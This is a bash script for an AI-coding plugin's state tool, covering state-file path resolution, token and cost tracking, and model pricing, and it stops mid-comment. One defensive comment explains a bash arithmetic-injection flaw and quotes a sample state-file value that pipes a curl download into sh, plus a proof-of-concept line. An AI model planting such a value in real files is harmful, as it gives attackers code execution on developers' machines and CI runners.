#!/usr/bin/env bash
# EDMV3-T61 AC1: the block between EDM-HELP-BEGIN and EDM-HELP-END below is sentinel-delimited,
# not a hardcoded `sed -n 'A,Bp'` line range -- the shared `print_help()` (CA-005,
# `_edm-cli-lib.sh`, sourced below) extracts between the sentinels with awk. A hardcoded range
# silently stops covering a new subcommand doc line added below its end unless two numbers are
# bumped in lockstep, which is exactly how `update-patterns` and `lint` fell out of `--help`
# before this ticket (the old range stopped at line 39). Add new subcommand doc lines anywhere
# inside the sentinel block; nothing else to update. Every `bin/` helper and `evals/` driver
# sources the same shared extractor now (CA-005) rather than each hand-copying it.
# EDM-HELP-BEGIN
# edm-state - read/write SRD/{PREFIX}/.edm-state.json files for the EDM plugin.
# Usage:
#   edm-state get <PREFIX>                              # print state JSON
#   edm-state set <PREFIX> <key> <value>                # set a top-level field (typed for known fields)
#   edm-state list [--paths]                            # list in-progress initiatives (--paths: print resolved initiative directories only, read-only, for edm-lint-artifacts --all)
#   edm-state active-initiatives                        # list initiatives with current_phase in 1-6
#   edm-state init <PREFIX>                             # write a fresh state file
#   edm-state approve-gate <PREFIX> <gate-num>|3.5|code-audit  # record a gate approval (numeric gate, compliance gate 3.5, or code-audit convergence)
#   edm-state phase-start <PREFIX> <phase-num>          # record phase start timestamp
#   edm-state phase-complete <PREFIX> <phase-num>       # record phase completion + duration
#   edm-state checkpoint-if-active                      # called by Stop/PreCompact hooks
#   edm-state record-test-coverage <PREFIX> <layer> <pct> [<epic>]  # record coverage % for a layer (optionally per-epic)
#   edm-state record-tests-added <PREFIX> <phase> <layer> <count>  # record test count by layer
#   edm-state get-coverage <PREFIX>                     # print coverage summary for all layers
#   edm-state srd-version <PREFIX> <version>            # set the SRD version (e.g. 1.0.0, 1.1.0)
#   edm-state migrate-schema <PREFIX>                   # backfill schema_version onto an existing initiative
#   edm-state archive <PREFIX>                          # mark initiative complete (git-aware)
#   edm-state write-handoff <PREFIX>                    # write/refresh HANDOFF.md for cross-user resumption
#   edm-state watch-impl                                # tail git log for ticket commits (called by monitor)
#   edm-state metrics-report <PREFIX|--all|--calibrate> [--with-human-baseline]  # raw cost/duration by default; --with-human-baseline opts into the human-cost comparison
#   edm-state validate <PREFIX>                         # check state file for anomalies (read-only)
#   edm-state gate-check <PREFIX> <gated-command>       # deterministic gate enforcement (read-only)
#   edm-state branch-check <PREFIX>                     # verify current git branch matches initiative_branch
#   edm-state record-branch <PREFIX>                    # re-derive initiative_branch from HEAD right now (post-checkout correction, T01)
#   edm-state git-lock-check                            # detect and remediate stale .git/index.lock
#   edm-state migrate-path --product <n> --description <s> <PREFIX>  # opt-in move to product-scoped layout
#   edm-state current-step <PREFIX> [<step>]                          # read/write orchestrator step (compaction resume)
#   edm-state session-start                                           # emit resume points for active initiatives (SessionStart hook)
#   edm-state audit-round-start <PREFIX> <code|srd|tickets> [--lenses L1,L3]  # increment audit-round counter (also records lens set + round_type), echo new value
#   edm-state audit-round-complete <PREFIX> <code|srd|tickets>        # record completion timestamp, duration, tokens and cost for the current round
#   edm-state render-ledger <PREFIX>                                   # deterministically render findings-ledger.md from findings-ledger.jsonl
#   edm-state audit-converged <PREFIX>                                 # query code-audit convergence over findings-ledger.jsonl (read-only)
#   edm-state record-partial-verdict <PREFIX> <ticket> <verdict> [note]  # persist per-ticket PASS/PARTIAL/FAIL
#   edm-state record-partial-verdict <PREFIX> <ticket> close <PASS|FAIL> <verification_ref>  # close an existing PARTIAL verdict
#   edm-state set-mode <PREFIX> <kind> <value>                        # set mode, lifecycle_mode, compliance_enabled, or implementation_mode
#   edm-state skip-phase <PREFIX> <phase-num> <rationale>              # record an intentionally skipped phase (rationale required, EDMV3-94)
#   edm-state set-supersedes <PREFIX> <other-prefix>                  # record which initiative this supersedes
#   edm-state set-forked-from <PREFIX> <other-prefix>                 # record which initiative this forked from
#   edm-state resolve-dir <PREFIX>                                    # resolve bare prefix to initiative directory (read-only)
#   edm-state set-parent <PREFIX> <PARENT>                           # set parent_prefix (validates PARENT exists)
#   edm-state add-related <PREFIX> <RELATED>                         # append to related_prefixes (idempotent)
#   edm-state update-patterns <PREFIX> <srd|ticket|qc|code|test-coverage>  # append novel audit findings to pattern library (T121)
#   edm-state lint <PREFIX>                                           # run edm-lint-artifacts over initiative artifacts (T115)
# EDM-HELP-END
set -euo pipefail

# CA-056: source the shared line-classification library (build_line_classes / ignored_line_set /
# is_ignored_line) so the pattern-library machinery below can tell whether a "### " heading or a
# target "## " heading sits inside a fenced code block, the same way bin/edm-lint-artifacts,
# bin/edm-check-grants and bin/edm-check-vocabulary already do. CA-005: also source the shared
# --help extractor (print_help) rather than defining a local copy.
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
source "${SCRIPT_DIR}/_edm-cli-lib.sh"
source "${SCRIPT_DIR}/_edm-lint-lib.sh"

SRD_ROOT="${EDM_SRD_ROOT:-${CLAUDE_PLUGIN_OPTION_SRD_ROOT:-./SRD}}"
SRD_FILENAME="${EDM_SRD_FILENAME:-${CLAUDE_PLUGIN_OPTION_SRD_FILENAME:-srd.md}}"
TICKET_PACK_DIRNAME="${EDM_TICKET_PACK_DIRNAME:-${CLAUDE_PLUGIN_OPTION_TICKET_PACK_DIRNAME:-tickets}}"
HUMAN_HOURLY_RATE_USD="${EDM_HUMAN_HOURLY_RATE_USD:-${CLAUDE_PLUGIN_OPTION_HUMAN_HOURLY_RATE_USD:-150}}"

# G21/CA-074: two-argument form -- see edm-validate-prefix's die() for the full rationale.
# Default of 1 preserved (this script's own long-standing exit-code contract, depended on by
# many callers/tests; every existing call site is single-argument, so this default keeps their
# behavior unchanged).
die() {
  local msg="$1" code="${2:-1}"
  echo "edm-state: $msg" >&2
  exit "$code"
}

# CA-160: validate HUMAN_HOURLY_RATE_USD once, right next to where its default is established
# above, rather than letting a bad value reach the jq program-string splice (:2557) or the
# printf math (:451) and produce a confusing downstream error. Plain non-negative decimal only
# (cents allowed): no leading '+', no exponent notation, no arithmetic metacharacters.
[[ "$HUMAN_HOURLY_RATE_USD" =~ ^[0-9]+(\.[0-9]+)?$ ]] \
  || die "invalid HUMAN_HOURLY_RATE_USD: '${HUMAN_HOURLY_RATE_USD}' (expected a non-negative number, e.g. 150 or 150.50)"

# to_int <value> [default] -- echo <value> when it is a bare non-negative integer, else <default>
# (0 if omitted). Every value from any external source -- state file, environment, or command
# line -- that reaches an arithmetic context MUST pass through here first (CA-157: this is not
# only a .edm-state.json concern).
#
# Why this exists: bash's arithmetic evaluation -- `[[ x -ge y ]]`, `(( ))`, `${a[expr]}` -- does
# NOT treat its operands as data. It recursively expands them, and an array subscript inside an
# operand is itself arithmetic-evaluated, which performs command substitution. So a state file
# containing
#     "current_phase": "a[$(curl -s http://host/p | sh)]"
# executes that pipeline the moment the value reaches `[[ "$phase" -ge 1 ]]`. Confirmed on
# bash 3.2.57: `x='a[$(touch /tmp/proof)]'; [[ "$x" -ge 1 ]]` creates the file.
#
# That is reachable with no user action. `.edm-state.json` is a committed, shared artifact by
# design (see CLAUDE.md, "State is in the project, not the plugin"), the SessionStart hook runs
# `edm-state session-start` on every session, and it globs every state file under the SRD root.
# Cloning or pulling a repository is enough. The blocking `test:state-validate` CI job reaches the
# same sinks via `edm-state validate`, so a merge request touching only a JSON data file would get
# code execution as the runner user.
#
# cmd_set validates these fields on WRITE; nothing validated them on READ, and a state file can
# arrive from git, a merge conflict, or a hand edit without ever passing through cmd_set.
to_int() {
  case "${1:-}" in
    ''|*[!0-9]*) printf '%s' "${2:-0}" ;;
    *)           printf '%s' "$1" ;;
  esac
}

# print_help <script-path> is sourced from _edm-cli-lib.sh above (CA-005): it prints everything
# between the EDM-HELP-BEGIN/EDM-HELP-END sentinel comment lines near the top of <script-path>
# (EDMV3-T61 AC1). awk, not a hardcoded `sed -n 'A,Bp'` line range: a hardcoded range silently
# stops covering new subcommand doc lines added below its end without the two numbers being
# bumped in lockstep, which is exactly how `update-patterns` and `lint` fell out of `--help`
# before that ticket. CA-005/CA-154: the same sentinel-based help-text convention is used by
# every `bin/` helper and the three `evals/` drivers -- not just this file -- and every one of
# those sites sources this same shared function rather than hand-copying it.

# list_state_files [--archived]
# Emits each unique .edm-state.json path, one per line, covering both flat (SRD/*/)
# and product-scoped (SRD/*/*/) layouts. Pass --archived to also include .archived/.
# De-duplicates using a linear seen-array (bash 3.2 compatible).
list_state_files() {
  local include_archived="${1:-}"
  local _lsf_seen=()
  local _lsf_f _lsf_already _lsf_s
  # shellcheck disable=SC2086 -- deliberate glob expansion; quoting would prevent the archived-state glob from expanding
  for _lsf_f in \
      "$SRD_ROOT"/*/.edm-state.json \
      "$SRD_ROOT"/*/*/.edm-state.json \
      ${include_archived:+"$SRD_ROOT"/.archived/*/.edm-state.json} \
      ${include_archived:+"$SRD_ROOT"/.archived/*/*/.edm-state.json}; do
    [[ -f "$_lsf_f" ]] || continue
    _lsf_already=0
    for _lsf_s in "${_lsf_seen[@]+"${_lsf_seen[@]}"}"; do
      [[ "$_lsf_s" == "$_lsf_f" ]] && _lsf_already=1 && break
    done
    [[ $_lsf_already -eq 1 ]] && continue
    _lsf_seen+=("$_lsf_f")
    printf '%s\n' "$_lsf_f"
  done
}

# phase_name_for <phase-num> -- returns human-readable phase name
phase_name_for() {
  case "$1" in
    0) echo "Not started" ;;
    1) echo "Phase 1 - Planning" ;;
    2) echo "Phase 2 - SRD Creation" ;;
    3) echo "Phase 3 - SRD Audit" ;;
    4) echo "Phase 4 - Ticket Creation" ;;
    5) echo "Phase 5 - Ticket Audit" ;;
    6) echo "Phase 6 - Implementation" ;;
    *) echo "Phase $1" ;;
  esac
}

require_jq() {
  command -v jq >/dev/null 2>&1 || die "jq is required (install: brew install jq / apt install jq)"
}

# Compute a stable hash of a file. Returns "absent" if the file doesn't exist.
# Tries sha256sum (Linux), then shasum -a 256 (macOS), then md5sum/md5 as last resort.
artifact_hash() {
  local file="$1"
  [[ -f "$file" ]] || { echo "absent"; return 0; }
  if command -v sha256sum >/dev/null 2>&1; then
    sha256sum "$file" | cut -d' ' -f1
  elif command -v shasum >/dev/null 2>&1; then
    shasum -a 256 "$file" | cut -d' ' -f1
  elif command -v md5sum >/dev/null 2>&1; then
    md5sum "$file" | cut -d' ' -f1
  else
    md5 -q "$file" 2>/dev/null || echo "unhashable"
  fi
}

# Record the current hash of a named artifact into .edm-state.json.
# artifact_name: a stable key like "srd" or "tickets"
# file_path: the actual file to hash
record_artifact_hash() {
  local prefix="$1" artifact_name="$2" file_path="$3"
  require_jq
  local hash t
  hash="$(artifact_hash "$file_path")"
  t="$(now_utc)"
  rmw_state "$prefix" '
    .artifact_hashes[$name] = {hash: $hash, path: $path, recorded_at: $t}
    | .last_updated = $t
  ' --arg name "$artifact_name" --arg hash "$hash" --arg path "$file_path" --arg t "$t"
}

# initiative_dir_for <PREFIX>
# Returns the initiative directory path (without /.edm-state.json).
# Delegates to state_file_for for layout resolution.
initiative_dir_for() {
  local state_file
  state_file="$(state_file_for "$1")"
  echo "${state_file%/.edm-state.json}"
}

# state_file_for <PREFIX>
# Single source of layout truth (SRD section 5.4). Resolves the .edm-state.json
# path for a given PREFIX under both the legacy flat layout and the new
# product-scoped layout (SRD/{PRODUCT}/{PREFIX}__{DESCRIPTION}/).
#
# Resolution order (first match wins):
#   1. Existing flat file   SRD/{PREFIX}/.edm-state.json          (AC2 backward compat)
#   2. Existing product dir SRD/*/{PREFIX}__*/.edm-state.json     (AC1 on-disk discovery)
#   3. Env vars EDM_PRODUCT + EDM_DESCRIPTION                     (AC1 pre-init compute)
#   4. Env var  EDM_PRODUCT only (glob within product)            (AC6)
#   5. Flat default (safe fallback for pre-init / legacy)         (AC5)
state_file_for() {
  local prefix="$1"
  # Reject any prefix containing path separators or dots to prevent path traversal.
  [[ "$prefix" =~ ^[A-Za-z0-9_-]+$ ]] || die "state_file_for: invalid PREFIX '${prefix}' (only alphanumeric, hyphen, underscore allowed)"
  local flat_path="${SRD_ROOT}/${prefix}/.edm-state.json"

  # AC2: Legacy flat state file already exists -- keep its path unchanged.
  [[ -f "$flat_path" ]] && echo "$flat_path" && return 0

  # AC1/AC6: Product-scoped directory already exists on disk.
  local matches=()
  local dir
  for dir in "${SRD_ROOT}"/*/"${prefix}"__*/; do
    # Strip trailing slash from glob expansion
    dir="${dir%/}"
    [[ -d "$dir" ]] && [[ -f "${dir}/.edm-state.json" ]] && matches+=("${dir}/.edm-state.json")
  done
  if [[ ${#matches[@]} -eq 1 ]]; then
    echo "${matches[0]}"
    return 0
  elif [[ ${#matches[@]} -gt 1 ]]; then
    echo "edm-state: WARNING: multiple product-scoped directories for ${prefix}; using first match" >&2
    echo "${matches[0]}"
    return 0
  fi

  # AC1: Compute product-scoped path from env vars when no on-disk match found.
  local product="${EDM_PRODUCT:-}"
  local description="${EDM_DESCRIPTION:-}"
  [[ -z "$product" || "$product" =~ ^[A-Za-z0-9_-]+$ ]] \
    || die "state_file_for: invalid EDM_PRODUCT '${product}' (only alphanumeric, hyphen, underscore allowed)"
  [[ -z "$description" || "$description" =~ ^[A-Za-z0-9_-]+$ ]] \
    || die "state_file_for: invalid EDM_DESCRIPTION '${description}' (only alphanumeric, hyphen, underscore allowed)"
  if [[ -n "$product" && -n "$description" ]]; then
    echo "${SRD_ROOT}/${product}/${prefix}__${description}/.edm-state.json"
    return 0
  fi

  # AC6: Product known but description unknown -- glob within product directory.
  if [[ -n "$product" ]]; then
    for dir in "${SRD_ROOT}/${product}/${prefix}__"*/; do
      dir="${dir%/}"
      [[ -d "$dir" ]] && echo "${dir}/.edm-state.json" && return 0
    done
  fi

  # AC5: Default flat path (pre-init or legacy initiative with no existing file).
  echo "$flat_path"
}

# ---- Cost tracking ---------------------------------------------------------
# Token usage is read from Claude Code session JSONL files at:
#   ~/.claude/projects/<encoded-cwd>/<session-id>.jsonl
# Each assistant message has .message.usage with input/output/cache token counts
# and .message.model identifying the model used.

session_dir_for_cwd() {
  local cwd
  cwd="$(pwd)"
  # Claude Code encodes the cwd by replacing both '/' and '.' with '-'
  echo "${HOME}/.claude/projects/$(echo "$cwd" | tr '/.' '-')"
}

# G45 (CA-276): the scoped (driving-session) and whole-directory-fallback branches inside
# get_session_tokens_since below previously each carried a byte-identical 23-line jq program
# whose only actual difference was already passed in via --arg mode -- hoisted here so a schema
# change to this program's output shape is made once instead of twice. _TOKEN_SUM_ZERO_JSON is
# the matching hoist of the duplicated empty-result literal (previously repeated at the
# directory-missing early return and the whole-directory branch's own final fallback). Defined
# here, ahead of the function's own doc comment below, so that comment block stays a single
# contiguous run of `#` lines immediately above `get_session_tokens_since()` -- the anchor
# `wave6-smoke.sh`'s T52 AC1 case scans for (a non-comment line between the doc comment and the
# function it documents resets that scan's buffer to empty).
_TOKEN_SUM_JQ='
  reduce inputs as $line (
    {msgs: [], bad: 0};
    if ($line | length) == 0 then .
    else
      (($line | fromjson?) // null) as $obj
      | if $obj == null then .bad += 1
        elif $obj.type == "assistant" and (($obj.timestamp // "") >= $since) then .msgs += [$obj]
        else .
        end
    end
  ) as $acc
  | ($acc.msgs) as $msgs
  | {
      input: ([$msgs[].message.usage.input_tokens // 0] | add // 0),
      output: ([$msgs[].message.usage.output_tokens // 0] | add // 0),
      cache_read: ([$msgs[].message.usage.cache_read_input_tokens // 0] | add // 0),
      cache_write_5m: ([$msgs[].message.usage.cache_creation.ephemeral_5m_input_tokens // 0] | add // 0),
      cache_write_1h: ([$msgs[].message.usage.cache_creation.ephemeral_1h_input_tokens // 0] | add // 0),
      model: ($msgs[-1].message.model // "unknown"),
      attribution_mode: $mode,
      unparseable_lines: $acc.bad
    }
'
_TOKEN_SUM_ZERO_JSON='{"input":0,"output":0,"cache_read":0,"cache_write_5m":0,"cache_write_1h":0,"model":"unknown","attribution_mode":"whole-directory","unparseable_lines":0}'

# Sum cumulative tokens across the driving session's assistant messages whose timestamp >=
# the given ISO 8601 time. Outputs JSON:
#   {input, output, cache_read, cache_write_5m, cache_write_1h, model, attribution_mode,
#    unparseable_lines}
# Cache writes are split by TTL because 5-min and 1-hour writes have different
# per-million-token rates.
#
# EDMV3-T52 AC1 (branch a chosen; recorded in decisions.md D25): every session JSONL under
# sessions_dir was previously summed unconditionally, so a second Claude Code window open on
# the same project inflated this phase's/round's token count. The driving session -- the one
# this process is actually running inside -- is identified as the single most-recently-
# modified *.jsonl file in sessions_dir at call time: the session actively being written to is
# always the most recently touched file on disk, because Claude Code appends to its own
# session's JSONL as the conversation proceeds. `ls -t` breaks mtime ties deterministically (by
# name), so this always yields exactly one candidate when the directory is non-empty.
# attribution_mode records which path was taken ("scoped" vs the AC2 whole-directory fallback)
# so a caller (cmd_phase_complete, cmd_audit_round_complete) can persist it and a reader can
# tell which mode produced a given figure. attribution_mode is a strict two-value enum
# ("scoped" | "whole-directory") documented everywhere as such (see plugins/edm/CLAUDE.md's
# state-field table and the wave6-smoke.sh enum-checking case) -- it never carries a third value
# for a parse failure. unparseable_lines is the separate counter for that: a torn/truncated JSONL
# line (routine, since Claude Code may still be appending to the driving session while this reads
# it) is counted here rather than overloading attribution_mode to also signal a parse failure,
# which would destroy the actual scoped-vs-whole-directory information attribution_mode exists to
# carry (G10).
#
# G10 root cause: `EXPR?` (`try EXPR` with no catch) produces ZERO outputs on a parse error, not
# `null` -- so a bare `($line | fromjson?) as $obj | ...` silently drops the entire reduce step
# for a malformed line, which resets the WHOLE accumulator to `null` for every line after it
# (jq's `reduce` semantics: a step with no output feeds `null` forward as the next state), wiping
# every message already summed, not just miscounting one line. `(($line | fromjson?) // null) as
# $obj` closes this: `//` supplies its right-hand default whenever the left side produces no
# output (exactly the parse-error case here), so `$obj` is reliably bound to `null` on a genuine
# parse failure and `.bad` increments correctly instead of the whole accumulator vanishing.
get_session_tokens_since() {
  local since="$1"
  local sessions_dir
  sessions_dir="$(session_dir_for_cwd)"
  if [[ ! -d "$sessions_dir" ]] || ! ls "$sessions_dir"/*.jsonl >/dev/null 2>&1; then
    echo "$_TOKEN_SUM_ZERO_JSON"
    return 0
  fi

  local driving_session
  driving_session="$(ls -t "$sessions_dir"/*.jsonl 2>/dev/null | head -1)"

  # EDMV3-T67 AC2: bound the read regardless of how large a single session JSONL grows. A
  # long-running conversation's own session file has no size limit, so an unbounded `jq -s` over
  # it would make phase-complete's latency proportional to total session history rather than to
  # the work since phase-start. `tail -n <cap>` keeps only the most recent lines before parsing --
  # safe because `since` is always a recent phase/round-start timestamp, so the messages that
  # matter are always among the newest lines, never the oldest. Override via
  # EDM_TOKEN_READ_LINE_CAP; default 20000 lines is generous for a single phase's turn count while
  # still bounding worst-case read cost.
  local _token_read_cap="${EDM_TOKEN_READ_LINE_CAP:-20000}"
  # CA-160: validate right next to where the default is established -- a non-numeric value
  # reaches `tail -n` and aborts with a raw, user-hostile "tail: illegal offset"; a value with a
  # leading '+' silently INVERTS the flag's meaning from "last N lines" to "from line N onward",
  # a silent behaviour change rather than an error. G47: a plain "0" used to pass this same
  # regex too -- `tail -n 0` emits nothing, so tokens record as 0, which then trips the
  # BLOCKING ZERO_TOKENS anomaly with no diagnostic connecting the cause (a misconfigured
  # env var) to the effect (a blocked archive). Require a positive integer.
  [[ "$_token_read_cap" =~ ^[1-9][0-9]*$ ]] \
    || die "invalid EDM_TOKEN_READ_LINE_CAP: '${_token_read_cap}' (expected a positive integer line count; 0 makes tail read zero lines, which reports 0 tokens and trips the blocking ZERO_TOKENS anomaly)"

  if [[ -n "$driving_session" && -f "$driving_session" ]]; then
    tail -n "$_token_read_cap" "$driving_session" \
      | jq -Rn --arg since "$since" --arg mode "scoped" "$_TOKEN_SUM_JQ" 2>/dev/null && return 0
  fi

  # AC2 fallback: the driving session could not be identified (e.g. a TOCTOU race where every
  # file was removed between the existence check above and the `ls -t` read) even though the
  # directory has jsonl files. Sums every session JSONL -- the pre-T52 behaviour -- and tags
  # the result so callers and readers can tell a whole-directory figure from a scoped one.
  #
  # G47: cap EACH session file independently, not the concatenation across all of them --
  # `cat *.jsonl | tail -n N` applied the cap to the CONCATENATION across every session file,
  # so with more than one session file only the tail of the LAST file(s) survived, silently
  # discarding earlier sessions' token counts entirely (contradicting this comment block's own
  # claim of per-file capping). Loop over the files individually instead.
  #
  # G18 (CA-207): emit a newline after each file's `tail` output, not just between the loop's
  # concatenated output as a whole. A session JSONL that lacks a trailing newline (routine for a
  # file still being appended to) previously had its last line spliced directly onto the NEXT
  # file's first line with no separator, corrupting both into one unparseable line and losing
  # both messages' token counts. The downstream jq program's `if ($line | length) == 0 then .`
  # branch already treats a resulting blank line as a no-op, so this is safe to add
  # unconditionally.
  local _g47_capped_lines=""
  _g47_capped_lines="$(for _tf in "$sessions_dir"/*.jsonl; do
    if [[ -f "$_tf" ]]; then
      tail -n "$_token_read_cap" "$_tf"
      printf '\n'
    fi
  done)" || true
  printf '%s\n' "$_g47_capped_lines" \
    | jq -Rn --arg since "$since" --arg mode "whole-directory" "$_TOKEN_SUM_JQ" 2>/dev/null \
    || echo "$_TOKEN_SUM_ZERO_JSON"
}

# _unpack_token_fields <tokens-json> -- shared unpack of get_session_tokens_since's JSON output
# (G46/CA-277). cmd_phase_complete and _cmd_audit_round_complete_body each carried an identical
# 14-line copy of this jq-per-field extraction; extracted here so a schema change to
# get_session_tokens_since's output shape is made once. bash 3.2 has no nameref/`local -n` for a
# helper to set an arbitrary CALLER-local by name, so -- matching the existing
# _save_traps/_restore_traps convention above -- this writes a fixed set of globals rather than
# taking a variable-name argument. Safe for the same reason that convention is safe here: neither
# caller invokes this helper re-entrantly or concurrently with another use of the same globals
# within one process.
_unpack_token_fields() {
  local _utf_json="$1"
  _EDM_TOKENS_INPUT="$(echo "$_utf_json" | jq -r '.input // 0')"
  _EDM_TOKENS_OUTPUT="$(echo "$_utf_json" | jq -r '.output // 0')"
  _EDM_TOKENS_CACHE_READ="$(echo "$_utf_json" | jq -r '.cache_read // 0')"
  _EDM_TOKENS_CACHE_WRITE_5M="$(echo "$_utf_json" | jq -r '.cache_write_5m // 0')"
  _EDM_TOKENS_CACHE_WRITE_1H="$(echo "$_utf_json" | jq -r '.cache_write_1h // 0')"
  _EDM_TOKENS_MODEL="$(echo "$_utf_json" | jq -r '.model // "unknown"')"
  _EDM_TOKENS_ATTRIBUTION_MODE="$(echo "$_utf_json" | jq -r '.attribution_mode // "whole-directory"')"
  _EDM_TOKENS_UNPARSEABLE_LINES="$(echo "$_utf_json" | jq -r '.unparseable_lines // 0')"
}

# Anthropic pricing per million tokens (USD), verified 2026-07-28.
# https://docs.anthropic.com/en/docs/about-claude/pricing
# Current generation: Opus 4.8 / Sonnet 4.7 / Haiku 4.6 -- the generation this plugin's agents
# actually run on (CLAUDE.md "Model and effort assignments"). Override via env vars to track
# rate changes without modifying this script:
#   EDM_OPUS_INPUT_RATE, EDM_OPUS_OUTPUT_RATE,
#   EDM_OPUS_CACHE_READ_RATE, EDM_OPUS_CACHE_WRITE_5M_RATE, EDM_OPUS_CACHE_WRITE_1H_RATE
#   (likewise for SONNET, HAIKU)
#
# Previous-generation identifiers (Opus 4.7 / Sonnet 4.6 / Haiku 4.5) are matched separately,
# below, at their own frozen (non-overridable) rates -- EDMV3-T52 AC9: a state file recorded
# before this ticket landed keeps the cost it actually incurred rather than being silently
# repriced under the current table when read back later.
compute_cost_usd() {
  local model="$1" input="$2" output="$3" cache_read="$4" cw5m="$5" cw1h="$6"
  local in_rate out_rate cr_rate cw5m_rate cw1h_rate
  case "$model" in
    *opus-4-7*|*opus-4.7*)
      in_rate=5; out_rate=25; cr_rate=0.50; cw5m_rate=6.25; cw1h_rate=10.00 ;;
    *sonnet-4-6*|*sonnet-4.6*)
      in_rate=3; out_rate=15; cr_rate=0.30; cw5m_rate=3.75; cw1h_rate=6.00 ;;
    *haiku-4-5*|*haiku-4.5*)
      in_rate=1; out_rate=5; cr_rate=0.10; cw5m_rate=1.25; cw1h_rate=2.00 ;;
    # Current generation, matched by EXPLICIT generation identifier rather than by bare family
    # wildcard (EDMV3 wave-C drift sweep). A bare `*opus*` arm here would sit ahead of the `*)`
    # warning arm and swallow every past and future Opus identifier, pricing an unrecognized
    # generation at this generation's rates silently -- measured before this fix,
    # `claude-opus-5-20260501` priced at the Opus 4.8 input rate and `claude-sonnet-9` at the
    # Sonnet 4.7 rate, neither with a warning. That is precisely the silent-guess AC10 exists to
    # prevent, and it defeated it from inside a known family. An unknown generation now falls
    # through to `*)` and warns.
    *opus-4-8*|*opus-4.8*)
      in_rate="${EDM_OPUS_INPUT_RATE:-6}"
      out_rate="${EDM_OPUS_OUTPUT_RATE:-30}"
      cr_rate="${EDM_OPUS_CACHE_READ_RATE:-0.60}"
      cw5m_rate="${EDM_OPUS_CACHE_WRITE_5M_RATE:-7.50}"
      cw1h_rate="${EDM_OPUS_CACHE_WRITE_1H_RATE:-12.00}"
      ;;
    *haiku-4-6*|*haiku-4.6*)
      in_rate="${EDM_HAIKU_INPUT_RATE:-1.20}"
      out_rate="${EDM_HAIKU_OUTPUT_RATE:-6.00}"
      cr_rate="${EDM_HAIKU_CACHE_READ_RATE:-0.12}"
      cw5m_rate="${EDM_HAIKU_CACHE_WRITE_5M_RATE:-1.50}"
      cw1h_rate="${EDM_HAIKU_CACHE_WRITE_1H_RATE:-2.40}"
      ;;
    unknown)
      # get_session_tokens_since's own sentinel for "no session data found at all" -- tokens
      # are necessarily 0 too (a real, explained zero), not AC10's silent-zero-from-an-
      # unrecognized-model case, so this is deliberately silent (no warning).
      in_rate="${EDM_SONNET_INPUT_RATE:-4}"
      out_rate="${EDM_SONNET_OUTPUT_RATE:-20}"
      cr_rate="${EDM_SONNET_CACHE_READ_RATE:-0.40}"
      cw5m_rate="${EDM_SONNET_CACHE_WRITE_5M_RATE:-5.00}"
      cw1h_rate="${EDM_SONNET_CACHE_WRITE_1H_RATE:-8.00}"
      ;;
    *sonnet-4-7*|*sonnet-4.7*)
      in_rate="${EDM_SONNET_INPUT_RATE:-4}"
      out_rate="${EDM_SONNET_OUTPUT_RATE:-20}"
      cr_rate="${EDM_SONNET_CACHE_READ_RATE:-0.40}"
      cw5m_rate="${EDM_SONNET_CACHE_WRITE_5M_RATE:-5.00}"
      cw1h_rate="${EDM_SONNET_CACHE_WRITE_1H_RATE:-8.00}"
      ;;
    *)
      # AC10: a model identifier that is neither a known family/generation substring nor the
      # "unknown" no-session sentinel produces an explicit warning rather than a silently-
      # zero or silently-guessed cost. Current-generation Sonnet rates are used as the least-
      # wrong placeholder (the modal tier); the warning names the model so the figure gets
      # investigated instead of trusted.
      echo "edm-state: WARNING: unrecognized model_used '${model}' -- cost estimated at current Sonnet-tier rates as a placeholder; verify manually" >&2
      in_rate="${EDM_SONNET_INPUT_RATE:-4}"
      out_rate="${EDM_SONNET_OUTPUT_RATE:-20}"
      cr_rate="${EDM_SONNET_CACHE_READ_RATE:-0.40}"
      cw5m_rate="${EDM_SONNET_CACHE_WRITE_5M_RATE:-5.00}"
      cw1h_rate="${EDM_SONNET_CACHE_WRITE_1H_RATE:-8.00}"
      ;;
  esac
  awk -v i="$input" -v o="$output" -v cr="$cache_read" -v c5="$cw5m" -v c1="$cw1h" \
      -v ir="$in_rate" -v orr="$out_rate" -v crr="$cr_rate" -v c5r="$cw5m_rate" -v c1r="$cw1h_rate" \
      'BEGIN { printf "%.4f", (i*ir + o*orr + cr*crr + c5*c5r + c1*c1r) / 1000000 }'
}

# Estimate human cost (USD) for a phase given:
#   - phase number (1-6)
#   - initiative size (Small / Medium / Large)
# Uses the Phase Timing Guidelines hours x HUMAN_HOURLY_RATE_USD.
human_cost_for_phase() {
  local phase="$1" size="$2"
  local hours
  case "${size}-${phase}" in
    "Small-1")  hours=0.5  ;; "Small-2")  hours=2  ;; "Small-3")  hours=1   ;;
    "Small-4")  hours=1    ;; "Small-5")  hours=0.5;; "Small-6")  hours=6   ;;
    "Medium-1") hours=1    ;; "Medium-2") hours=4  ;; "Medium-3") hours=2   ;;
    "Medium-4") hours=3    ;; "Medium-5") hours=1  ;; "Medium-6") hours=18  ;;
    "Large-1")  hours=2    ;; "Large-2")  hours=8  ;; "Large-3")  hours=4   ;;
    "Large-4")  hours=6    ;; "Large-5")  hours=2  ;; "Large-6")  hours=36  ;;
    *)          hours=0    ;;
  esac
  awk -v h="$hours" -v r="$HUMAN_HOURLY_RATE_USD" 'BEGIN { printf "%.2f", h*r }'
}

read_state() {
  local prefix="$1"
  local f
  f="$(state_file_for "$prefix")"
  [[ -f "$f" ]] || die "no state file for $prefix at $f"
  cat "$f"
}

# _rmw_state_body <state-file> <jq-filter> [jq-args...]   (runs INSIDE with_state_lock)
# Reads the file, applies the jq filter atomically, writes back. (write_state/_write_state_body
# were removed in CA-007 -- every mutator goes through rmw_state; this is the sole write body.)
# On jq failure the temp file is removed and a non-zero status is returned (NOT die) so callers
# that wrap rmw_state in `if !` (e.g. cmd_migrate_path's rollback) can react; bare callers abort
# under set -e as before. (CA-009)
_restore_trap() {
  local sig="$1" saved="$2"
  if [[ -n "$saved" ]]; then
    eval "$saved"
  else
    trap - "$sig"
  fi
}

# _save_traps / _restore_traps -- G84 (round-3 CA-244): collapses the four-line
# save-then-restore EXIT/INT/TERM/HUP sequence (write_atomic and with_state_lock each
# hand-repeated this several times) into one call each. Fixed set of globals rather than
# named caller-local variables -- bash 3.2 has no nameref/`local -n` to let a helper set an
# arbitrary caller-local by name. Safe because write_atomic and with_state_lock never share
# this save/restore pair concurrently within the SAME process: write_atomic's own trap layer
# runs either in the top-level process directly, or inside with_state_lock's own forked
# "( "$@" )" subshell, which is a separate process with its own independent copy of these
# globals (see the CA-142/CA-143 comment above write_atomic for why the fork boundary matters
